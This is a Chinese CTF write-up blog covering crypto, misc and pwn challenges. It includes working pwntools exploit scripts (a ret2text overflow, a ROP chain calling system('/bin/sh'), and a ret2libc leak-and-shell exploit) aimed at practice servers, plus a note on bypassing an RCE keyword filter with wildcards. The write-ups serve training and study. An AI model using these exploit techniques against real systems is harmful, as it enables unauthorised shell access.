<p>IDA打开，发现内容和上一题几乎一样，唯独不同的点就是溢出空间只够一个后门函数的地址，于是撰写脚本，因为基地址为止，需要碰，所以脚本些许变化</p>
<p><img src="/img/1666614380686.png" alt="1666614380686"></p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>

        <span class="token comment">#p=process('./babystack')</span>
        p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"43.143.7.127"</span><span class="token punctuation">,</span><span class="token number">28054</span><span class="token punctuation">)</span>
        elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./easystack'</span><span class="token punctuation">)</span>
        context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"amd64"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>

        backdoor<span class="token operator">=</span><span class="token number">0x1185</span>

        payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What's your name?"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="just-rce"><a href="#just-rce" class="headerlink" title="just rce"></a>just rce</h3><p>简单的rce，通过rev指令逆序输出就得到flag，后面配上通配符绕过关键字</p>
<p><img src="/img/1666618211863.png" alt="1666618211863"></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Where-is-flag？"><a href="#Where-is-flag？" class="headerlink" title="Where is flag？"></a>Where is flag？</h3><p>流量分析，wireshark打开后导出特定分组http，发现有个flag压缩包，打开文件发现是png图片格式，010打开，这里发现缺少头文件，于是修复好，发现是个二维码，扫出来的内容存在零宽容度字符，在线网站解密得到flag。</p>
<p><img src="/img/1666777976579.png" alt="1666777976579"></p>
<h3 id="搬好小板凳听故事"><a href="#搬好小板凳听故事" class="headerlink" title="搬好小板凳听故事"></a>搬好小板凳听故事</h3><p>简单的解决，用ciphey，好一个三花淡奶！</p>
<p><img src="/img/1666778096125.png" alt="1666778096125"></p>
<h3 id="村中奇怪的故事"><a href="#村中奇怪的故事" class="headerlink" title="村中奇怪的故事"></a>村中奇怪的故事</h3><p>这玩意儿图片真给我误导了，没想到就是百家姓加密，后来仔细一看悟出来了，赶紧去试，后来七七上hint也验证了我的想法。说真的，这故事够狗屎，给我看得一愣一愣，解出来之后，居然平台后台flag还是错的，给我整得怀疑人生。</p>
<h3 id="蜜蜂和蛆"><a href="#蜜蜂和蛆" class="headerlink" title="蜜蜂和蛆"></a>蜜蜂和蛆</h3><p>crc32爆破，通过pass1和pass2分别得到一段密码，然后打开得到一张画着蜜蜂和蛆的png，改宽高，得到一个二维码，扫出来base64解密，<del>文件都删完了，懒得复现了</del></p>
<h3 id="王八快跑"><a href="#王八快跑" class="headerlink" title="王八快跑"></a>王八快跑</h3><p>让你跑你就跑，签个到！哈哈哈哈</p>
<h3 id="略略略来抓我啊"><a href="#略略略来抓我啊" class="headerlink" title="略略略来抓我啊"></a>略略略来抓我啊</h3><p>社工还是不太擅长，很久没做过了，找了很久，第一张图暴露了一个钱塘驿，直接暴露了位置，然后就找着地图找宾馆，是个眼力活，也是个体力活</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="websign"><a href="#websign" class="headerlink" title="websign"></a>websign</h3><p>F12不管用？那我手动总行了吧！</p>
<p><img src="/img/1666778791713.png" alt="1666778791713"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="爱丽丝梦境的兔子"><a href="#爱丽丝梦境的兔子" class="headerlink" title="爱丽丝梦境的兔子"></a>爱丽丝梦境的兔子</h3><p>兔子密码、社会主义核心价值观密码和栅栏密码，简单套娃</p>
<h3 id="disparity-rsa"><a href="#disparity-rsa" class="headerlink" title="disparity_rsa"></a>disparity_rsa</h3><p>这个rsa有手就行，我直接用RsaCTFtools解的，脚本都懒得写了，这里就不放图复现了<del>（是真的懒</del></p>
<h3 id="Easy-base64"><a href="#Easy-base64" class="headerlink" title="Easy_base64"></a>Easy_base64</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token comment"># 这里有个固定的字符串是flag</span>
<span class="token comment"># 1.根据flag的base64编码可以确定第一个字符的ASCII码对应的是90</span>
flag <span class="token operator">=</span> <span class="token string">'flag&#123;&#125;'</span>
tmp <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 2.根据结果往前推ASCII码</span>
a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    t <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>
    a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> t
    <span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">','</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
109,34,5,34,91,46,73,21,50,55,60,50,34,93,37,116,59,23,36,2,94,63,74,41,46,119,60,88,45,39,52,36,52,52,50,12,15,20,28,42,11,50,20,25,47,118,34,93,32,42,59,40,62,91,108,56
'''</span>

b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">]</span>

<span class="token comment"># 3.解密</span>
a <span class="token operator">=</span> <span class="token string">b'ZmxhZ3tzaHVtdV9sMHZlX2gxNV9jaGFsbGVuZzNfdmVyOV9tdTNofQ==h'</span>
tmp <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="unsafe-prime"><a href="#unsafe-prime" class="headerlink" title="unsafe_prime"></a>unsafe_prime</h3><p>这里考察的知识点就是当n不是由两个不相等的质数相乘得到的时的解法，属于另一种欧拉定理的运用，phin不再是(p-1)*(q-1)，而是p^3-p^2</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''
from Crypto.Util.number import *
#from flag import flag
import libnum
p=getPrime(1024)
n=p**3
e=65537
flag='flag&#123;luoxiheng&#125;'
c=pow(libnum.s2n(flag),e,n)
print(n)
print(c)
#1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731
#1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224
'''</span>
<span class="token keyword">import</span> libnum
<span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> binascii
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

n<span class="token operator">=</span><span class="token number">1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731</span>
e<span class="token operator">=</span><span class="token number">65537</span>
p <span class="token operator">=</span> <span class="token number">121216033233585299462279856144422199686140149244819402908675131452249143435823157035320400025743305736047792084067723177554239638229731651194515823556880874798950035236056266154727789682357822323822962110560589110432270068487448525123808163818606838762211746373156874518622834972063360072190758655502892772811</span>


n <span class="token operator">=</span> p<span class="token operator">**</span><span class="token number">3</span>
phi_n<span class="token operator">=</span> p<span class="token operator">**</span><span class="token number">3</span><span class="token operator">-</span>p<span class="token operator">**</span><span class="token number">2</span>
c<span class="token operator">=</span><span class="token number">1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224</span>
d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>

m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token comment">#print(binascii.unhexlify(hex(m)[2:]))</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
string <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>(HarekazeCTF2019)baby_rop(ret2text)</title>
    <url>/2021/0620c1a3.html</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="HarekazeCTF2019-baby-rop-ret2text"><a href="#HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="[HarekazeCTF2019]baby_rop(ret2text)"></a>[HarekazeCTF2019]baby_rop(ret2text)</h2><p>查看保护机制，开了NX，64位</p>
<p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p>
<p>IDA打开，F5查看main函数</p>
<p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p>
<p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p>
<p>看见system函数</p>
<p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p>
<p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p>
<p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p>
<p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p>
<p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *
context.log_level &#x3D; &quot;debug&quot;

# io &#x3D; process(&#39;.&#x2F;babyrop&#39;)
io &#x3D; remote(&#39;node3.buuoj.cn&#39;,&#39;28379&#39;)
e &#x3D; ELF(&#39;.&#x2F;babyrop&#39;)

binsh_addr &#x3D; 0x601048
system_addr &#x3D; e.symbols[&#39;system&#39;]
pop_rdi &#x3D; 0x400683

io.recvuntil(&#39;your name?&#39;)
payload &#x3D; 0x18 * b&#39;a&#39; + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
io.sendline(payload)
io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p>
<p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>(OGeek2019)babyrop(ret2libc)</title>
    <url>/2021/062072ce.html</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="OGeek2019-babyrop-ret2libc"><a href="#OGeek2019-babyrop-ret2libc" class="headerlink" title="[OGeek2019]babyrop(ret2libc)"></a>[OGeek2019]babyrop(ret2libc)</h1><p>查看保护机制，32位，开了NX</p>
<p><img src="/img/image-20210504170711043.png" alt="image-20210504170711043"></p>
<p>IDA打开查看发现有随机数问题</p>
<p><img src="/img/image-20210504171507650.png" alt="image-20210504171507650"></p>
<p>通过strncmp函数比较随机数与输入数是否相等</p>
<p><img src="/img/image-20210504171816124.png" alt="image-20210504171816124"></p>
<p>这里想到可以通过\x00来绕过strncmp函数，因为strlen遇到\x00会停止</p>
<p><img src="/img/image-20210504181922297.png" alt="image-20210504181922297"></p>
<p>因为a1是函数sub_804871F的返回值，那就让a1为 \xff 这样就可以进行栈溢出了 </p>
<p><img src="/img/image-20210513155325475.png" alt="image-20210513155325475"></p>
<p>libc.so可以给我们提供一套函数的地址，并且在里面虽有函数的相对位置都是固定的。意思是如果我们知道了每一个函数的真实地址，我们可以根据给出的libc.so计算出其他函数的真实地址(实际上就是要得到system_addr)</p>
<p>这里选择泄露write_addr，然后计算出system_addr</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.因为给出了libc版本，所以我们可以直接使用<br>2.在这题中，我们可以泄露write函数的地址，然后用题目提供的动态共享库算出内存中system函数的地址<br>3.再用system函数的地址覆盖返回地址</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
<span class="token comment"># io = process('./pwn')</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token string">'28990'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
main_addr <span class="token operator">=</span> <span class="token number">0x8048825</span>
payload <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">7</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xE7</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span>  p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Correct\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
write_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">'write_addr: '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">"system_addr   "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">"binsh_addr   "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">7</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xE7</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span>  p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> 
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Correct"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后脚本一跑，拿到了flag</p>
<p><img src="/img/image-20210620200813979.png" alt="image-20210620200813979"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>bjdctf_2020_babyrop</title>
    <url>/2021/06268fcf.html</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>检查保护机制，开启NX，64位</p>
<p><img src="/img/image-20210626120953251.png" alt="image-20210626120953251"></p>
<p>运行程序，看见有libc的字眼，想到应该和libc泄露有关</p>
<p><img src="/img/image-20210626121205881.png" alt="image-20210626121205881"></p>
<p>shift+F12查找字符串，没有找到system(‘/bin/sh’)，看样子应该就是这个类型的题了</p>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p><img src="/img/image-20210626121435224.png" alt="image-20210626121435224"></p>
<p>看到一个vuln()函数，应该会是解题的关键，点进去看，果然</p>
<p><img src="/img/image-20210626121534041.png" alt="image-20210626121534041"></p>
<p>找到了漏洞，read读入长度为0x64，buf大小为0x20，就从这个地方切入</p>
<p><img src="/img/image-20210626122951905.png" alt="image-20210626122951905"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.利用puts函数去泄露libc版本</p>
<p>2.计算偏移量，算出程序里的system函数和字符串’/bin/sh’的地址</p>
<p>3.利用溢出漏洞，构造rop，夺权</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>先泄露libc，64位程序传参时需要用到寄存器</p>
<p>当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9</p>
<p>当参数大于等于7个时，前6个就是前面6个，后面的参数就从右向左放入栈中，和32位一样</p>
